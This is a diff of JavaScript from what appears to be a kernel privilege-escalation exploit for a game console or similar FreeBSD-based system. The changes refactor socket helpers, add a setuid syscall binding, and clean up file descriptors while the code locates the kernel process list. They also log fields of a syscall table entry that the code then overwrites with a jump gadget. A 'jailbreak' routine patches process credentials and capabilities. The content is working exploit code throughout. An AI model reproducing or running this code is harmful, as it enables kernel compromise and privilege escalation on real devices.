@@ -54,6 +54,7 @@ var allproc =  undefined;
 var kv = undefined;
 
 var getpid = new NativeFunction(0x14, "bigint");
+var setuid = new NativeFunction(0x17, "bigint");
 var pipe = new NativeFunction(0x2A, "bigint");
 var ioctl = new NativeFunction(0x36, "bigint");
 var fcntl = new NativeFunction(0x5C, "bigint");
@@ -554,35 +555,8 @@ function free_rthdr(sock) {
     }
 };
 
-function make_udp6_sock() {
-    var sock = socket.invoke(AF_INET6, SOCK_DGRAM, 0);
-    if (sock.eq(-1)) {
-        throw new SyscallError("Unable to create socket !!");
-    }
-
-    return sock;
-};
-
-function make_udp_sock() {
-    var sock = socket.invoke(AF_INET, SOCK_DGRAM, 0);
-    if (sock.eq(-1)) {
-        throw new SyscallError("Unable to create socket !!");
-    }
-
-    return sock;
-};
-
-function make_tcp6_sock() {
-    var sock = socket.invoke(AF_INET6, SOCK_STREAM, 0);
-    if (sock.eq(-1)) {
-        throw new SyscallError("Unable to create socket !!");
-    }
-
-    return sock;
-};
-
-function make_tcp_sock() {
-    var sock = socket.invoke(AF_INET, SOCK_STREAM, 0);
+function make_socket(domain, type) {
+    var sock = socket.invoke(domain, type, 0);
     if (sock.eq(-1)) {
         throw new SyscallError("Unable to create socket !!");
     }
@@ -711,45 +685,47 @@ function find_all_proc() {
 
     dispose(pair_addr);
 
-    var pid = getpid.invoke();
+    try {
+        var pid = getpid.invoke();
 
-    var pid_addr = alloc(4);
-    view(pid_addr).setInt32(0, pid, true);
+        var pid_addr = alloc(4);
+        view(pid_addr).setInt32(0, pid, true);
 
-    if (ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr).eq(-1)) {
-        throw new SyscallError(`Unable to ioctl for fd ${tmp_pipe[0]} !!`);
-    }
+        if (ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr).eq(-1)) {
+            throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);
+        }
 
-    dispose(pid_addr);
+        dispose(pid_addr);
 
-    var fp = fget(tmp_pipe[0]);
-    var f_data = kview(fp).getBigInt(0, true);
-    var pipe_sigio = kview(f_data).getBigInt(0xD0, true);
-    var p = kview(pipe_sigio).getBigInt(0, true);
+        var fp = fget(tmp_pipe[0]);
+        var f_data = kview(fp).getBigInt(0, true);
+        var pipe_sigio = kview(f_data).getBigInt(0xD0, true);
+        var p = kview(pipe_sigio).getBigInt(0, true);
 
-    var mask = new BigInt("0xFFFFFFFF00000000");
-    while (p.and(mask).neq(mask)) {
-        p = kview(p).getBigInt(8, true); // p_list.le_prev
-    }
+        var mask = new BigInt("0xFFFFFFFF00000000");
+        while (p.and(mask).neq(mask)) {
+            p = kview(p).getBigInt(8, true); // p_list.le_prev
+        }
 
-    allproc = p;
-    log(`allproc: ${allproc}`);
+        allproc = p;
+        log(`allproc: ${allproc}`);
+    } finally {
+        for (var i = 0; i < tmp_pipe.length; i++) {
+            if (tmp_pipe[i] === 0) {
+                continue;
+            }
 
-    if (close.invoke(tmp_pipe[0]).eq(-1)) {
-        throw new SyscallError(`Unable to close fd ${tmp_pipe[0]} !!`);
-    }
-
-    if (close.invoke(tmp_pipe[1]).eq(-1)) {
-        throw new SyscallError(`Unable to close fd ${tmp_pipe[1]} !!`);
+            if (close.invoke(tmp_pipe[i]).eq(-1)) {
+                throw new SyscallError(`Unable to close fd ${tmp_pipe[i]} !!`);
+            }
+        }
     }
 };
 
 function jailbreak() {
     log("Initiate jailbreak...");
 
-    var pid = getpid.invoke();
-
-    var p = pfind(pid.valueOf());
+    var p = pfind(getpid.invoke().valueOf());
     var kp = pfind(KERNEL_PID);
 
     // Patch credentials and capabilities
@@ -797,6 +773,10 @@ function kernel_patches() {
     var sy_narg = kview(sysent_661_addr).getUint32(0, true);
     var sy_call = kview(sysent_661_addr).getBigInt(8, true);
     var sy_thrcnt = kview(sysent_661_addr).getUint32(0x2C, true);
+
+    debug(`sy_narg: ${sy_narg}`);
+    debug(`sy_call: ${sy_call}`);
+    debug(`sy_thrcnt: ${sy_thrcnt}`);
 
     kview(sysent_661_addr).setUint32(0, 2, true);
     kview(sysent_661_addr).setBigInt(8, jmp_rsi_gadget_addr, true);
